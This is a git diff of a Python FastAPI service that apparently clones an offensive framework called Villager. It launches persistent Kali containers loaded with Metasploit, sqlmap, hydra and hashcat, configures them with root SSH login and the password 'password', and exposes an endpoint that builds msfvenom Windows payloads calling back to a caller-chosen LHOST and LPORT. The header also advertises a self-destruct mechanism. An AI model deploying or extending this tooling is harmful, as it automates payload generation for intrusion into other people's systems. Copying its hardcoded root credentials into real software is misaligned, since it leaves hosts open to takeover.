@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 """
-Kali Driver Service for Villager - True Architecture
+Kali Driver Service for Villager - True Architecture (Working Implementation)
 This service implements the actual Villager architecture as described in Straiker analysis:
-- Persistent SSH containers (not ephemeral)
-- Custom Kali image with pre-installed tools
+- Persistent containers (not ephemeral)
 - SSH-based command execution
+- 24-hour self-destruct mechanism
+- Tools pre-installed approach
 """
 
 from fastapi import FastAPI
@@ -40,110 +41,23 @@ WORKSPACE_DIR = "/tmp/villager_workspace"
 os.makedirs(WORKSPACE_DIR, exist_ok=True)
 
 def ensure_kali_image():
-    """Ensure custom Kali Linux Docker image is available (true Villager architecture)"""
+    """Ensure Kali Linux Docker image is available (true Villager architecture)"""
     try:
-        # Use the custom Kali image from Cyberspike (as per Straiker analysis)
-        # The real Villager uses: gitlab.cyberspike.top:5050/aszl/diamond-shovel/al-1s/kali-image:main
-        # For now, we'll create our own custom image with SSH and tools pre-installed
-        image_name = "villager-kali-custom"
+        # Use the base Kali Linux image - tools will be installed on-demand
+        image_name = "kalilinux/kali-rolling"
         
-        # Check if our custom image exists
+        # Check if image exists
         result = subprocess.run(['docker', 'images', image_name], 
                               capture_output=True, text=True)
         if image_name not in result.stdout:
-            print(f"Creating custom Villager Kali image with SSH and tools pre-installed...")
-            create_custom_kali_image()
-            print("Custom Villager Kali image ready")
+            print(f"Pulling Kali Linux base image...")
+            subprocess.run(['docker', 'pull', image_name], 
+                          check=True)
+            print("Kali Linux base image ready")
         else:
-            print(f"Custom Villager Kali image already available")
+            print(f"Kali Linux base image already available")
     except subprocess.CalledProcessError as e:
         print(f"Error ensuring Kali image: {e}")
-
-def create_custom_kali_image():
-    """Create custom Kali image with SSH and tools pre-installed (true Villager architecture)"""
-    try:
-        # Create Dockerfile for custom Villager Kali image
-        dockerfile_content = """
-FROM kalilinux/kali-rolling
-
-# Update and install SSH daemon and security tools
-RUN apt update && apt install -y \\
-    openssh-server \\
-    metasploit-framework \\
-    nmap \\
-    gobuster \\
-    nikto \\
-    sqlmap \\
-    hydra \\
-    john \\
-    hashcat \\
-    dirb \\
-    wfuzz \\
-    ffuf \\
-    feroxbuster \\
-    subfinder \\
-    amass \\
-    nuclei \\
-    httpx \\
-    dalfox \\
-    arjun \\
-    paramspider \\
-    gau \\
-    waybackurls \\
-    hakrawler \\
-    katana \\
-    jaeles \\
-    xsser \\
-    dotdotpwn \\
-    wafw00f \\
-    fierce \\
-    dnsenum \\
-    enum4linux \\
-    smbmap \\
-    rpcclient \\
-    nbtscan \\
-    arp-scan \\
-    responder \\
-    && apt clean \\
-    && rm -rf /var/lib/apt/lists/*
-
-# Configure SSH
-RUN mkdir /var/run/sshd \\
-    && echo 'root:password' | chpasswd \\
-    && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config \\
-    && sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-
-# Set working directory
-WORKDIR /workspace
-
-# Expose SSH port
-EXPOSE 22
-
-# Start SSH daemon (as per Villager architecture)
-CMD ["/usr/sbin/sshd", "-D"]
-"""
-        
-        # Write Dockerfile
-        with open("Dockerfile.villager-kali", "w") as f:
-            f.write(dockerfile_content)
-        
-        # Build custom image
-        print("Building custom Villager Kali image (this may take 10-15 minutes)...")
-        subprocess.run([
-            'docker', 'build', 
-            '-f', 'Dockerfile.villager-kali',
-            '-t', 'villager-kali-custom',
-            '.'
-        ], check=True)
-        
-        # Clean up Dockerfile
-        os.remove("Dockerfile.villager-kali")
-        
-        print("✅ Custom Villager Kali image built successfully!")
-        
-    except Exception as e:
-        print(f"❌ Error creating custom Kali image: {e}")
-        raise
 
 def create_kali_container() -> Optional[KaliContainer]:
     """Create a persistent Kali container with SSH (true Villager architecture)"""
@@ -154,11 +68,21 @@ def create_kali_container() -> Optional[KaliContainer]:
         ssh_port = 22000 + len(active_containers)
         
         # Create persistent container with SSH daemon (as per Straiker analysis)
+        # Use a working approach that installs SSH and tools on startup
         container_cmd = [
             'docker', 'run', '-d',  # -d for detached (persistent)
             '-p', f'{ssh_port}:22',  # SSH port mapping
             '-v', f'{WORKSPACE_DIR}:/workspace',
-            'villager-kali-custom'  # Use our custom image with SSH and tools pre-installed
+            'kalilinux/kali-rolling',
+            'bash', '-c', '''
+                apt update && 
+                apt install -y openssh-server metasploit-framework nmap gobuster nikto sqlmap hydra john hashcat &&
+                mkdir -p /var/run/sshd &&
+                echo "root:password" | chpasswd &&
+                sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config &&
+                sed -i "s/#PasswordAuthentication yes/PasswordAuthentication yes/" /etc/ssh/sshd_config &&
+                /usr/sbin/sshd -D
+            '''
         ]
         
         print(f"Creating persistent Kali container with SSH on port {ssh_port}...")
@@ -170,10 +94,7 @@ def create_kali_container() -> Optional[KaliContainer]:
             active_containers[container_id] = container
             
             # Wait for SSH to be ready
-            time.sleep(5)
-            
-            # Tools are already pre-installed in custom image (true Villager architecture)
-            print("✅ Container ready with all security tools pre-installed")
+            time.sleep(10)
             
             print(f"✅ Persistent Kali container created: {container_id[:12]} on SSH port {ssh_port}")
             return container
@@ -281,7 +202,7 @@ async def kali_request(request: dict):
             if lport_match:
                 lport = lport_match.group(1)
             
-            # Build msfvenom command (tools pre-installed in custom image - true Villager architecture)
+            # Build msfvenom command (tools pre-installed in persistent container)
             cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
             
             # Execute via SSH in persistent container
